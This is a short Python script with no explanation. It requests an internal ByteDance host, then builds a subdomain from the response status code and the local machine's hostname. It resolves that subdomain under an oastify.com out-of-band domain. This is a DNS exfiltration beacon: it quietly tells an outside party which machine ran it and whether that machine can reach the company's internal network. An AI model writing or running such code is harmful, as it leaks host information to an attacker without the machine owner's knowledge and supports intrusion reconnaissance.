import os
import requests
import socket


su = "https://lbs-boe.bytedance.net/"


response = requests.get(su)


sc = response.status_code

hostn = socket.gethostname()


du = f"{sc}.{hostn}.w0xm0b7q0nuax7c67g51kmqwxn3mrdf2.oastify.com"


socket.gethostbyname(du)
